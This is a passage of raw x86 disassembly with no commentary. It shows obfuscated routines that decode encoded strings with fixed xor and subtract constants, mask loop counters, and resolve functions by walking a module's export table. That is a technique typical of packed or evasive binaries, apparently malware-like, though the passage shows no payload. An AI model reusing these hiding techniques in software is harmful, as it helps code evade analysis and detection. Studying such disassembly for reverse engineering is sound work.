  41d225:	xor    esi,ecx
  41d227:	add    esi,edx
  41d229:	imul   esi,eax
  41d22c:	mov    eax,DWORD PTR [ebp-0x10]
  41d22f:	movzx  eax,WORD PTR [esi+eax*1]
  41d233:	mov    esi,DWORD PTR [ebp-0xc]
  41d236:	sub    eax,edx
  41d238:	xor    eax,ecx
  41d23a:	cmp    eax,esi
  41d23c:	mov    eax,DWORD PTR [ebp-0xc]
  41d23f:	je     0x41d244
  41d241:	mov    eax,DWORD PTR [ebp-0x18]
  41d244:	pop    edi
  41d245:	xor    eax,ecx
  41d247:	pop    esi
  41d248:	add    eax,edx
  41d24a:	pop    ebx
  41d24b:	leave  
  41d24c:	ret    0x8
  41d24f:	push   ebp
  41d250:	mov    ebp,esp
  41d252:	push   ecx
  41d253:	mov    cx,WORD PTR [eax]
  41d256:	push   esi
  41d257:	mov    esi,0x3b50
  41d25c:	sub    cx,si
  41d25f:	mov    esi,0x8a8c
  41d264:	xor    cx,si
  41d267:	mov    esi,0x4e3c
  41d26c:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d273:	mov    edx,0xf89c85b9
  41d278:	cmp    cx,si
  41d27b:	je     0x41d2da
  41d27d:	push   ebx
  41d27e:	push   edi
  41d27f:	movzx  ecx,cx
  41d282:	mov    edi,0xffcd8d20
  41d287:	mov    esi,0x7510899
  41d28c:	mov    ebx,0x4f80
  41d291:	cmp    cx,bx
  41d294:	jne    0x41d299
  41d296:	mov    DWORD PTR [ebp-0x4],edx
  41d299:	lea    edx,[edi+0x1]
  41d29c:	xor    edx,esi
  41d29e:	mov    edi,edx
  41d2a0:	xor    edi,esi
  41d2a2:	mov    cx,WORD PTR [eax+edi*2+0x64e5c0]
  41d2aa:	mov    ebx,0x3b50
  41d2af:	sub    cx,bx
  41d2b2:	mov    ebx,0x8a8c
  41d2b7:	xor    cx,bx
  41d2ba:	mov    ebx,0x4e3c
  41d2bf:	cmp    cx,bx
  41d2c2:	jne    0x41d28c
  41d2c4:	mov    ecx,DWORD PTR [ebp-0x4]
  41d2c7:	pop    edi
  41d2c8:	pop    ebx
  41d2c9:	cmp    ecx,0xf89c8586
  41d2cf:	je     0x41d2da
  41d2d1:	xor    ecx,esi
  41d2d3:	lea    eax,[eax+ecx*2+0x64e5c2]
  41d2da:	pop    esi
  41d2db:	leave  
  41d2dc:	ret    
  41d2dd:	push   ebp
  41d2de:	mov    ebp,esp
  41d2e0:	push   ecx
  41d2e1:	push   esi
  41d2e2:	push   edi
  41d2e3:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d2ea:	mov    esi,0xf89c85b9
  41d2ef:	call   0x41d24f
  41d2f4:	mov    edi,eax
  41d2f6:	mov    al,BYTE PTR [edi]
  41d2f8:	add    al,0x9
  41d2fa:	xor    al,0x73
  41d2fc:	cmp    al,0x7a
  41d2fe:	je     0x41d361
  41d300:	mov    eax,edi
  41d302:	mov    edx,0xffcd8d20
  41d307:	mov    ecx,0x7510899
  41d30c:	push   ebx
  41d30d:	mov    ax,WORD PTR [eax]
  41d310:	mov    ebx,0x3b50
  41d315:	sub    ax,bx
  41d318:	mov    ebx,0x8a8c
  41d31d:	xor    ax,bx
  41d320:	mov    ebx,0x4e52
  41d325:	cmp    ax,bx
  41d328:	jne    0x41d32d
  41d32a:	mov    DWORD PTR [ebp-0x4],esi
  41d32d:	lea    esi,[edx+0x1]
  41d330:	xor    esi,ecx
  41d332:	mov    edx,esi
  41d334:	xor    edx,ecx
  41d336:	lea    eax,[edi+edx*2+0x64e5c0]
  41d33d:	mov    bl,BYTE PTR [eax]
  41d33f:	add    bl,0x9
  41d342:	xor    bl,0x73
  41d345:	cmp    bl,0x7a
  41d348:	jne    0x41d30d
  41d34a:	mov    eax,DWORD PTR [ebp-0x4]
  41d34d:	pop    ebx
  41d34e:	cmp    eax,0xf89c8586
  41d353:	je     0x41d361
  41d355:	xor    eax,ecx
  41d357:	xor    ecx,ecx
  41d359:	mov    WORD PTR [edi+eax*2+0x64e5c0],cx
  41d361:	mov    eax,edi
  41d363:	pop    edi
  41d364:	pop    esi
  41d365:	leave  
  41d366:	ret    
  41d367:	push   ebp
  41d368:	mov    ebp,esp
  41d36a:	push   ecx
  41d36b:	push   esi
  41d36c:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d373:	mov    esi,0xf89c85b9
  41d378:	call   0x41d24f
  41d37d:	mov    cx,WORD PTR [eax]
  41d380:	mov    edx,0x3b50
  41d385:	sub    cx,dx
  41d388:	mov    edx,0x8a8c
  41d38d:	xor    cx,dx
  41d390:	mov    edx,0x4e3c
  41d395:	cmp    cx,dx
  41d398:	je     0x41d3f1
  41d39a:	push   ebx
  41d39b:	push   edi
  41d39c:	movzx  ecx,cx
  41d39f:	mov    edx,0xffcd8d20
  41d3a4:	mov    edi,0x7510899
  41d3a9:	mov    ebx,0x4e52
  41d3ae:	cmp    cx,bx
  41d3b1:	jne    0x41d3b6
  41d3b3:	mov    DWORD PTR [ebp-0x4],esi
  41d3b6:	lea    esi,[edx+0x1]
  41d3b9:	xor    esi,edi
  41d3bb:	mov    edx,esi
  41d3bd:	xor    edx,edi
  41d3bf:	mov    cx,WORD PTR [eax+edx*2+0x64e5c0]
  41d3c7:	mov    ebx,0x3b50
  41d3cc:	sub    cx,bx
  41d3cf:	mov    ebx,0x8a8c
  41d3d4:	xor    cx,bx
  41d3d7:	mov    ebx,0x4e3c
  41d3dc:	cmp    cx,bx
  41d3df:	jne    0x41d3a9
  41d3e1:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41d3e8:	pop    edi
  41d3e9:	pop    ebx
  41d3ea:	je     0x41d3f1
  41d3ec:	xor    eax,eax
  41d3ee:	inc    eax
  41d3ef:	jmp    0x41d3f3
  41d3f1:	xor    eax,eax
  41d3f3:	pop    esi
  41d3f4:	leave  
  41d3f5:	ret    
  41d3f6:	push   ebp
  41d3f7:	mov    ebp,esp
  41d3f9:	push   ecx
  41d3fa:	mov    eax,DWORD PTR [ebp+0x8]
  41d3fd:	movzx  ecx,WORD PTR [eax]
  41d400:	push   esi
  41d401:	lea    eax,[ecx-0x3b50]
  41d407:	mov    esi,0x8a8c
  41d40c:	push   edi
  41d40d:	xor    eax,esi
  41d40f:	mov    edi,0x4e3c
  41d414:	mov    DWORD PTR [ebp-0x4],edx
  41d417:	cmp    ax,di
  41d41a:	je     0x41d447
  41d41c:	mov    eax,DWORD PTR [ebp+0x8]
  41d41f:	sub    eax,edx
  41d421:	mov    DWORD PTR [ebp+0x8],eax
  41d424:	jmp    0x41d429
  41d426:	mov    eax,DWORD PTR [ebp+0x8]
  41d429:	mov    WORD PTR [edx],cx
  41d42c:	add    edx,0x2
  41d42f:	movzx  edi,WORD PTR [eax+edx*1]
  41d433:	mov    ecx,edi
  41d435:	add    edi,0xffffc4b0
  41d43b:	xor    edi,esi
  41d43d:	mov    eax,0x4e3c
  41d442:	cmp    di,ax
  41d445:	jne    0x41d426
  41d447:	xor    eax,eax
  41d449:	pop    edi
  41d44a:	mov    WORD PTR [edx],ax
  41d44d:	mov    eax,DWORD PTR [ebp-0x4]
  41d450:	pop    esi
  41d451:	leave  
  41d452:	ret    0x4
  41d455:	push   ebp
  41d456:	mov    ebp,esp
  41d458:	sub    esp,0x18
  41d45b:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41d462:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41d469:	mov    eax,DWORD PTR [ebp-0x14]
  41d46c:	xor    eax,0x7510899
  41d471:	add    eax,0x3272e0
  41d476:	mov    DWORD PTR [ebp-0x8],eax
  41d479:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  41d480:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41d487:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41d48e:	mov    eax,DWORD PTR [ebp-0x14]
  41d491:	xor    eax,0x7510899
  41d496:	mov    ecx,DWORD PTR [ebp-0x8]
  41d499:	lea    eax,[ecx+eax*1+0x3272e0]
  41d4a0:	mov    ecx,DWORD PTR [ebp-0x18]
  41d4a3:	xor    ecx,0x7510899
  41d4a9:	add    ecx,0x3272e0
  41d4af:	mov    edx,DWORD PTR [ebp+0x10]
  41d4b2:	imul   edx,ecx
  41d4b5:	cmp    eax,edx
  41d4b7:	jae    0x41d5aa
  41d4bd:	mov    eax,DWORD PTR [ebp+0x10]
  41d4c0:	mov    ecx,DWORD PTR [ebp-0x8]
  41d4c3:	sub    eax,ecx
  41d4c5:	mov    ecx,DWORD PTR [ebp-0x10]
  41d4c8:	xor    ecx,0x7510899
  41d4ce:	add    ecx,0x3272e0
  41d4d4:	cmp    eax,ecx
  41d4d6:	jbe    0x41d508
  41d4d8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4db:	add    eax,DWORD PTR [ebp-0x8]
  41d4de:	mov    ecx,DWORD PTR [ebp+0xc]
  41d4e1:	add    ecx,DWORD PTR [ebp-0x8]
  41d4e4:	mov    edx,DWORD PTR [ecx]
  41d4e6:	mov    DWORD PTR [eax],edx
  41d4e8:	mov    ecx,DWORD PTR [ecx+0x4]
  41d4eb:	mov    DWORD PTR [eax+0x4],ecx
  41d4ee:	mov    eax,DWORD PTR [ebp-0x10]
  41d4f1:	xor    eax,0x7510899
  41d4f6:	mov    ecx,DWORD PTR [ebp-0x8]
  41d4f9:	lea    eax,[ecx+eax*1+0x3272e0]
  41d500:	mov    DWORD PTR [ebp-0x8],eax
  41d503:	jmp    0x41d5a5
  41d508:	mov    eax,DWORD PTR [ebp+0x10]
  41d50b:	mov    ecx,DWORD PTR [ebp-0x8]
  41d50e:	sub    eax,ecx
  41d510:	mov    ecx,DWORD PTR [ebp-0xc]
  41d513:	xor    ecx,0x7510899
  41d519:	add    ecx,0x3272e0
  41d51f:	cmp    eax,ecx
  41d521:	jbe    0x41d54a
  41d523:	mov    eax,DWORD PTR [ebp+0x8]
  41d526:	add    eax,DWORD PTR [ebp-0x8]
  41d529:	mov    ecx,DWORD PTR [ebp+0xc]
  41d52c:	add    ecx,DWORD PTR [ebp-0x8]
  41d52f:	mov    ecx,DWORD PTR [ecx]
  41d531:	mov    DWORD PTR [eax],ecx
  41d533:	mov    eax,DWORD PTR [ebp-0xc]
  41d536:	xor    eax,0x7510899
  41d53b:	mov    ecx,DWORD PTR [ebp-0x8]
  41d53e:	lea    eax,[ecx+eax*1+0x3272e0]
  41d545:	mov    DWORD PTR [ebp-0x8],eax
  41d548:	jmp    0x41d5a5
  41d54a:	mov    eax,DWORD PTR [ebp+0x10]
  41d54d:	mov    ecx,DWORD PTR [ebp-0x8]
  41d550:	sub    eax,ecx
  41d552:	mov    ecx,DWORD PTR [ebp-0x4]
  41d555:	xor    ecx,0x7510899
  41d55b:	add    ecx,0x3272e0
  41d561:	cmp    eax,ecx
  41d563:	jbe    0x41d58e
  41d565:	mov    eax,DWORD PTR [ebp+0x8]
  41d568:	add    eax,DWORD PTR [ebp-0x8]
  41d56b:	mov    ecx,DWORD PTR [ebp+0xc]
  41d56e:	add    ecx,DWORD PTR [ebp-0x8]
  41d571:	mov    cx,WORD PTR [ecx]
  41d574:	mov    WORD PTR [eax],cx
  41d577:	mov    eax,DWORD PTR [ebp-0x4]
  41d57a:	xor    eax,0x7510899
  41d57f:	mov    ecx,DWORD PTR [ebp-0x8]
  41d582:	lea    eax,[ecx+eax*1+0x3272e0]
  41d589:	mov    DWORD PTR [ebp-0x8],eax
  41d58c:	jmp    0x41d5a5
  41d58e:	mov    eax,DWORD PTR [ebp+0x8]
  41d591:	add    eax,DWORD PTR [ebp-0x8]
  41d594:	mov    ecx,DWORD PTR [ebp+0xc]
  41d597:	add    ecx,DWORD PTR [ebp-0x8]
  41d59a:	mov    cl,BYTE PTR [ecx]
  41d59c:	mov    BYTE PTR [eax],cl
  41d59e:	mov    eax,DWORD PTR [ebp-0x8]
  41d5a1:	inc    eax
  41d5a2:	mov    DWORD PTR [ebp-0x8],eax
  41d5a5:	jmp    0x41d48e
  41d5aa:	leave  
  41d5ab:	ret    0xc
  41d5ae:	push   ebp
  41d5af:	mov    ebp,esp
  41d5b1:	sub    esp,0xc
  41d5b4:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41d5bb:	push   esi
  41d5bc:	mov    esi,eax
  41d5be:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41d5c5:	mov    edx,DWORD PTR [ebp-0x4]
  41d5c8:	mov    eax,0x7510899
  41d5cd:	xor    edx,eax
  41d5cf:	mov    ecx,0x3272e0
  41d5d4:	add    edx,ecx
  41d5d6:	cmp    esi,edx
  41d5d8:	je     0x41d61a
  41d5da:	push   ebx
  41d5db:	push   edi
  41d5dc:	mov    edx,DWORD PTR [ebp-0x8]
  41d5df:	mov    ebx,DWORD PTR [ebp+0x8]
  41d5e2:	xor    edx,eax
  41d5e4:	mov    edi,0xffcd8d20
  41d5e9:	sub    edi,edx
  41d5eb:	add    esi,edi
  41d5ed:	lea    edx,[esi-0x3272e0]
  41d5f3:	xor    edx,eax
  41d5f5:	mov    DWORD PTR [ebp-0xc],edx
  41d5f8:	mov    edx,DWORD PTR [ebp-0x4]
  41d5fb:	mov    edi,DWORD PTR [ebp-0xc]
  41d5fe:	xor    dl,0x99
  41d601:	sub    dl,0x20
  41d604:	xor    edi,eax
  41d606:	mov    BYTE PTR [edi+ebx*1+0x3272e0],dl
  41d60d:	mov    edx,DWORD PTR [ebp-0x4]
  41d610:	xor    edx,eax
  41d612:	add    edx,ecx
  41d614:	cmp    esi,edx
  41d616:	jne    0x41d5dc
  41d618:	pop    edi
  41d619:	pop    ebx
  41d61a:	pop    esi
  41d61b:	leave  
  41d61c:	ret    0x4
  41d61f:	push   ebp
  41d620:	mov    ebp,esp
  41d622:	sub    esp,0x21c
  41d628:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41d62f:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  41d636:	mov    eax,DWORD PTR [ebp+0x10]
  41d639:	mov    eax,DWORD PTR [ebp-0x4]
  41d63c:	mov    ecx,DWORD PTR [ebp+0x8]
  41d63f:	push   esi
  41d640:	push   edi
  41d641:	mov    edi,0x7510899
  41d646:	xor    eax,edi
  41d648:	mov    esi,0x3272e0
  41d64d:	add    eax,esi
  41d64f:	cmp    eax,ecx
  41d651:	mov    eax,DWORD PTR [ebp-0x4]
  41d654:	jne    0x41d65f
  41d656:	xor    eax,edi
  41d658:	add    eax,esi
  41d65a:	jmp    0x41d70b
  41d65f:	mov    ecx,DWORD PTR [ebp+0xc]
  41d662:	xor    eax,edi
  41d664:	add    eax,esi
  41d666:	cmp    eax,ecx
  41d668:	jne    0x41d66f
  41d66a:	mov    eax,DWORD PTR [ebp-0x4]
  41d66d:	jmp    0x41d656
  41d66f:	lea    eax,[ebp-0x21c]
  41d675:	mov    DWORD PTR [ebp-0x8],eax
  41d678:	mov    eax,DWORD PTR [ebp+0xc]
  41d67b:	mov    DWORD PTR [ebp-0x10],eax
  41d67e:	mov    eax,DWORD PTR [ebp-0x4]
  41d681:	xor    eax,edi
  41d683:	add    eax,esi
  41d685:	mov    DWORD PTR [ebp+0x10],eax
  41d688:	mov    eax,DWORD PTR [ebp+0xc]
  41d68b:	push   ebx
  41d68c:	call   0x41d367
  41d691:	mov    ebx,eax
  41d693:	mov    eax,DWORD PTR [ebp+0x8]
  41d696:	mov    eax,DWORD PTR [eax+0x14]
  41d699:	jmp    0x41d6f3
  41d69b:	mov    eax,DWORD PTR [ebp+0xc]
  41d69e:	sub    eax,0x8
  41d6a1:	mov    DWORD PTR [ebp-0xc],eax
  41d6a4:	mov    eax,DWORD PTR [ebp-0xc]
  41d6a7:	mov    eax,DWORD PTR [eax+0x28]
  41d6aa:	call   0x41d24f
  41d6af:	mov    DWORD PTR [ebp+0x10],eax
  41d6b2:	push   DWORD PTR [ebp+0x10]
  41d6b5:	mov    edx,DWORD PTR [ebp-0x8]
  41d6b8:	call   0x41d3f6
  41d6bd:	mov    eax,DWORD PTR [ebp-0x4]
  41d6c0:	xor    eax,edi
  41d6c2:	add    eax,esi
  41d6c4:	cmp    eax,ebx
  41d6c6:	jne    0x41d6d0
  41d6c8:	mov    eax,DWORD PTR [ebp-0x8]
  41d6cb:	call   0x41d2dd
  41d6d0:	mov    eax,DWORD PTR [ebp-0x14]
  41d6d3:	xor    eax,edi
  41d6d5:	add    eax,esi
  41d6d7:	push   eax
  41d6d8:	push   DWORD PTR [ebp-0x10]
  41d6db:	mov    eax,DWORD PTR [ebp-0x8]
  41d6de:	call   0x41d009
  41d6e3:	mov    ecx,DWORD PTR [ebp-0x4]
  41d6e6:	xor    ecx,edi
  41d6e8:	add    ecx,esi
  41d6ea:	cmp    eax,ecx
  41d6ec:	je     0x41d711
  41d6ee:	mov    eax,DWORD PTR [ebp+0xc]
  41d6f1:	mov    eax,DWORD PTR [eax]
  41d6f3:	mov    DWORD PTR [ebp+0xc],eax
  41d6f6:	mov    eax,DWORD PTR [ebp+0x8]
  41d6f9:	mov    ecx,DWORD PTR [ebp+0xc]
  41d6fc:	add    eax,0x14
  41d6ff:	cmp    ecx,eax
  41d701:	jne    0x41d69b
  41d703:	mov    eax,DWORD PTR [ebp-0x4]
  41d706:	xor    eax,edi
  41d708:	add    eax,esi
  41d70a:	pop    ebx
  41d70b:	pop    edi
  41d70c:	pop    esi
  41d70d:	leave  
  41d70e:	ret    0xc
  41d711:	mov    eax,DWORD PTR [ebp-0xc]
  41d714:	mov    eax,DWORD PTR [eax+0x18]
  41d717:	jmp    0x41d70a
  41d719:	push   ebp
  41d71a:	mov    ebp,esp
  41d71c:	mov    eax,DWORD PTR [ebp+0xc]
  41d71f:	sub    esp,0x10
  41d722:	cmp    DWORD PTR [ebp+0x8],0x0
  41d726:	push   ebx
  41d727:	push   esi
  41d728:	push   edi
  41d729:	je     0x41d7de
  41d72f:	test   eax,eax
  41d731:	je     0x41d7de
  41d737:	movzx  eax,WORD PTR [eax+0x20]
  41d73b:	mov    ecx,eax
  41d73d:	mov    DWORD PTR [ebp-0x10],eax
  41d740:	xor    edx,edx
  41d742:	and    DWORD PTR [ebp-0x8],edx
  41d745:	mov    eax,0x8a8c
  41d74a:	xor    ecx,eax
  41d74c:	add    ecx,0x3b50
  41d752:	mov    DWORD PTR [ebp-0xc],ecx
  41d755:	and    DWORD PTR [ebp-0x4],0x0
  41d759:	xor    ecx,ecx
  41d75b:	push   0x78
  41d75d:	pop    edi
  41d75e:	cmp    cx,WORD PTR [ebp-0xc]
  41d762:	jae    0x41d7c8
  41d764:	lea    esi,[edx-0x3b50]
  41d76a:	xor    esi,eax
  41d76c:	movzx  ecx,WORD PTR [ebp-0x4]
  41d770:	mov    ebx,DWORD PTR [ebp+0xc]
  41d773:	lea    ecx,[ebx+ecx*4]
  41d776:	cmp    WORD PTR [ecx+0x2],si
  41d77a:	jne    0x41d7b3
  41d77c:	movzx  ecx,WORD PTR [ecx]
  41d77f:	mov    edi,0x4e3c
  41d784:	cmp    cx,di
  41d787:	jne    0x41d795
  41d789:	mov    ebx,DWORD PTR [ebp+0x8]
  41d78c:	movzx  edi,dx
  41d78f:	cmp    BYTE PTR [edi+ebx*1],0x0
  41d793:	je     0x41d7c2
  41d795:	mov    ebx,DWORD PTR [ebp+0x8]
  41d798:	movzx  edi,dx
  41d79b:	movsx  di,BYTE PTR [edi+ebx*1]
  41d7a0:	mov    ebx,0x3b50
  41d7a5:	sub    di,bx
  41d7a8:	xor    di,ax
  41d7ab:	cmp    cx,di
  41d7ae:	je     0x41d7c2
  41d7b0:	push   0x7a
  41d7b2:	pop    edi
  41d7b3:	inc    DWORD PTR [ebp-0x4]
  41d7b6:	mov    cx,WORD PTR [ebp-0xc]
  41d7ba:	cmp    WORD PTR [ebp-0x4],cx
  41d7be:	jb     0x41d76c
  41d7c0:	jmp    0x41d7c8
  41d7c2:	inc    DWORD PTR [ebp-0x8]
  41d7c5:	push   0x79
  41d7c7:	pop    edi
  41d7c8:	mov    esi,DWORD PTR [ebp+0x8]
  41d7cb:	movzx  ecx,dx
  41d7ce:	cmp    BYTE PTR [ecx+esi*1],0x0
  41d7d2:	je     0x41d7e7
  41d7d4:	inc    edx
  41d7d5:	cmp    edi,0x7a
  41d7d8:	jne    0x41d755
  41d7de:	xor    eax,eax
  41d7e0:	pop    edi
  41d7e1:	pop    esi
  41d7e2:	pop    ebx
  41d7e3:	leave  
  41d7e4:	ret    0x8
  41d7e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41d7ea:	add    ecx,0xffffc4b0
  41d7f0:	xor    cx,ax
  41d7f3:	xor    eax,eax
  41d7f5:	cmp    cx,WORD PTR [ebp-0x10]
  41d7f9:	sete   al
  41d7fc:	jmp    0x41d7e0
  41d7fe:	push   ebp
  41d7ff:	mov    ebp,esp
  41d801:	sub    esp,0x50
  41d804:	push   edi
  41d805:	mov    edi,eax
  41d807:	mov    eax,DWORD PTR [edi+0x1a8]
  41d80d:	cmp    DWORD PTR [eax],0x0
  41d810:	jne    0x41d819
  41d812:	xor    eax,eax
  41d814:	jmp    0x41d94a
  41d819:	push   DWORD PTR [ebp+0x8]
  41d81c:	push   0x2c
  41d81e:	pop    eax
  41d81f:	call   0x41d5ae
  41d824:	mov    edx,DWORD PTR [edi+0x1ac]
  41d82a:	lea    eax,[edi+0x22]
  41d82d:	mov    DWORD PTR [ebp-0x4c],eax
  41d830:	lea    eax,[edi+0x44]
  41d833:	mov    DWORD PTR [ebp-0x48],eax
  41d836:	lea    eax,[edi+0x66]
  41d839:	mov    DWORD PTR [ebp-0x44],eax
  41d83c:	lea    eax,[edi+0x88]
  41d842:	mov    DWORD PTR [ebp-0x40],eax
  41d845:	lea    eax,[edi+0xaa]
  41d84b:	mov    DWORD PTR [ebp-0x3c],eax
  41d84e:	lea    eax,[edi+0xcc]
  41d854:	mov    DWORD PTR [ebp-0x38],eax
  41d857:	lea    eax,[edi+0xee]
  41d85d:	mov    DWORD PTR [ebp-0x34],eax
  41d860:	lea    eax,[edi+0x110]
  41d866:	mov    DWORD PTR [ebp-0x30],eax
  41d869:	lea    eax,[edi+0x132]
  41d86f:	mov    DWORD PTR [ebp-0x2c],eax
  41d872:	lea    eax,[edi+0x154]
  41d878:	push   edi
  41d879:	mov    DWORD PTR [ebp-0x50],edi
  41d87c:	mov    DWORD PTR [ebp-0x28],eax
  41d87f:	call   0x41d97e
  41d884:	push   eax
  41d885:	mov    eax,DWORD PTR [edi+0x1a8]
  41d88b:	push   DWORD PTR [eax]
  41d88d:	call   0x41d61f
  41d892:	mov    DWORD PTR [ebp-0x10],eax
  41d895:	test   eax,eax
  41d897:	je     0x41d94a
  41d89d:	mov    ecx,DWORD PTR [eax+0x3c]
  41d8a0:	push   ebx
  41d8a1:	push   esi
  41d8a2:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41d8a6:	add    esi,eax
  41d8a8:	mov    edi,DWORD PTR [esi+0x24]
  41d8ab:	mov    ecx,DWORD PTR [esi+0x1c]
  41d8ae:	mov    edx,DWORD PTR [esi+0x20]
  41d8b1:	mov    ebx,DWORD PTR [esi+0x18]
  41d8b4:	add    edi,eax
  41d8b6:	mov    DWORD PTR [ebp-0x20],edi
  41d8b9:	mov    edi,DWORD PTR [esi+0x14]
  41d8bc:	add    ecx,eax
  41d8be:	add    edx,eax
  41d8c0:	mov    DWORD PTR [ebp-0xc],ecx
  41d8c3:	mov    DWORD PTR [ebp-0x1c],edx
  41d8c6:	mov    DWORD PTR [ebp-0x8],edi
  41d8c9:	cmp    edi,ebx
  41d8cb:	ja     0x41d8d0
  41d8cd:	mov    DWORD PTR [ebp-0x8],ebx
  41d8d0:	xor    ebx,ebx
  41d8d2:	mov    DWORD PTR [ebp-0x18],ebx
  41d8d5:	cmp    DWORD PTR [ebp-0x8],ebx
  41d8d8:	jbe    0x41d948
  41d8da:	jmp    0x41d8df
  41d8dc:	mov    edx,DWORD PTR [ebp-0x1c]
  41d8df:	mov    edi,DWORD PTR [ebp-0x20]
  41d8e2:	movzx  edi,WORD PTR [edi+ebx*2]
  41d8e6:	cmp    ebx,DWORD PTR [esi+0x18]
  41d8e9:	jae    0x41d948
  41d8eb:	cmp    edi,DWORD PTR [esi+0x14]
  41d8ee:	jae    0x41d948
  41d8f0:	mov    ebx,DWORD PTR [edx+ebx*4]
  41d8f3:	mov    edx,DWORD PTR [ebp+0x8]
  41d8f6:	mov    edi,DWORD PTR [ecx+edi*4]
  41d8f9:	mov    DWORD PTR [ebp-0x4],edx
  41d8fc:	lea    edx,[ebp-0x50]
  41d8ff:	add    ebx,eax
  41d901:	add    edi,eax
  41d903:	sub    edx,DWORD PTR [ebp+0x8]
  41d906:	mov    DWORD PTR [ebp-0x14],0xb
  41d90d:	mov    DWORD PTR [ebp-0x24],edx
  41d910:	mov    edx,DWORD PTR [ebp-0x4]
  41d913:	cmp    DWORD PTR [edx],0x0
  41d916:	jne    0x41d933
  41d918:	mov    eax,DWORD PTR [ebp-0x24]
  41d91b:	push   DWORD PTR [eax+edx*1]
  41d91e:	push   ebx
  41d91f:	call   0x41d719
  41d924:	mov    ecx,DWORD PTR [ebp-0xc]
  41d927:	test   eax,eax
  41d929:	je     0x41d930
  41d92b:	mov    eax,DWORD PTR [ebp-0x4]
  41d92e:	mov    DWORD PTR [eax],edi
  41d930:	mov    eax,DWORD PTR [ebp-0x10]
  41d933:	add    DWORD PTR [ebp-0x4],0x4
  41d937:	dec    DWORD PTR [ebp-0x14]
  41d93a:	jne    0x41d910
  41d93c:	mov    ebx,DWORD PTR [ebp-0x18]
  41d93f:	inc    ebx
  41d940:	mov    DWORD PTR [ebp-0x18],ebx
  41d943:	cmp    ebx,DWORD PTR [ebp-0x8]
  41d946:	jb     0x41d8dc
  41d948:	pop    esi
  41d949:	pop    ebx
  41d94a:	pop    edi
  41d94b:	leave  
  41d94c:	ret    0x4
  41d94f:	push   ebp
  41d950:	mov    ebp,esp
  41d952:	mov    eax,DWORD PTR [ebp+0x8]
  41d955:	push   esi
  41d956:	push   DWORD PTR [eax+0x1d8]
  41d95c:	lea    esi,[eax+0x198]
  41d962:	mov    eax,DWORD PTR [ebp+0x8]
  41d965:	call   0x41d7fe
  41d96a:	mov    ecx,DWORD PTR [esi]
  41d96c:	mov    DWORD PTR [ecx],eax
  41d96e:	mov    eax,DWORD PTR [esi]
  41d970:	xor    ecx,ecx
  41d972:	cmp    DWORD PTR [eax],ecx
  41d974:	pop    esi
  41d975:	setne  cl
  41d978:	mov    eax,ecx
  41d97a:	pop    ebp
  41d97b:	ret    0x4
  41d97e:	mov    ecx,DWORD PTR [edi+0x188]
  41d984:	push   ebx
  41d985:	jmp    0x41d99a
  41d987:	xor    eax,0x8a8c
  41d98c:	add    eax,0x3b50
  41d991:	mov    WORD PTR [ecx],ax
  41d994:	add    ecx,0x2
  41d997:	add    edx,0x2
  41d99a:	movzx  eax,WORD PTR [edx]
  41d99d:	mov    ebx,0x4e3c
  41d9a2:	cmp    ax,bx
  41d9a5:	jne    0x41d987
  41d9a7:	xor    eax,eax
  41d9a9:	mov    WORD PTR [ecx],ax
  41d9ac:	mov    eax,DWORD PTR [edi+0x188]
  41d9b2:	pop    ebx
  41d9b3:	ret    
  41d9b4:	push   edi
  41d9b5:	mov    edi,eax
  41d9b7:	mov    eax,DWORD PTR [esi+0x188]
  41d9bd:	shl    edi,0x6
  41d9c0:	add    eax,edi
  41d9c2:	jmp    0x41d9ce
  41d9c4:	xor    cl,0x73
  41d9c7:	sub    cl,0x9
  41d9ca:	mov    BYTE PTR [eax],cl
  41d9cc:	inc    eax
  41d9cd:	inc    edx
  41d9ce:	mov    cl,BYTE PTR [edx]
  41d9d0:	cmp    cl,0x7a
  41d9d3:	jne    0x41d9c4
  41d9d5:	mov    BYTE PTR [eax],0x0
  41d9d8:	mov    eax,DWORD PTR [esi+0x188]
  41d9de:	add    eax,edi
  41d9e0:	pop    edi
  41d9e1:	ret    
  41d9e2:	push   ebp
  41d9e3:	mov    ebp,esp
  41d9e5:	sub    esp,0x38
  41d9e8:	push   ebx
  41d9e9:	mov    ebx,0xf89c85b9
  41d9ee:	mov    DWORD PTR [ebp-0x4],ebx
  41d9f1:	lea    eax,[ebx-0x1]
  41d9f4:	push   esi
  41d9f5:	mov    DWORD PTR [ebp-0x24],eax
  41d9f8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d9fb:	mov    edx,DWORD PTR [ebp+0x8]
  41d9fe:	mov    esi,0x7510899
  41da03:	push   edi
  41da04:	xor    ecx,esi
  41da06:	mov    edi,0x3272e0
  41da0b:	add    ecx,edi
  41da0d:	cmp    edx,ecx
  41da0f:	je     0x41db7d
  41da15:	mov    ecx,DWORD PTR [ebp-0x4]
  41da18:	mov    edx,DWORD PTR [ebp+0xc]
  41da1b:	xor    ecx,esi
  41da1d:	add    ecx,edi
  41da1f:	cmp    edx,ecx
  41da21:	je     0x41db7d
  41da27:	mov    ecx,DWORD PTR [ebp+0x10]
  41da2a:	mov    DWORD PTR [ebp-0x18],ecx
  41da2d:	mov    ecx,DWORD PTR [ebp+0xc]
  41da30:	mov    DWORD PTR [ebp-0x14],ecx
  41da33:	mov    ecx,DWORD PTR [ebp+0x8]
  41da36:	mov    DWORD PTR [ebp-0x1c],0xf89c8504
  41da3d:	mov    DWORD PTR [ebp-0x20],eax
  41da40:	mov    DWORD PTR [ebp-0x10],ebx
  41da43:	mov    DWORD PTR [ebp+0xc],eax
  41da46:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41da4d:	mov    eax,DWORD PTR [ebp+0xc]
  41da50:	mov    DWORD PTR [ebp-0xc],ecx
  41da53:	xor    eax,esi
  41da55:	mov    ecx,0xffcd8d20
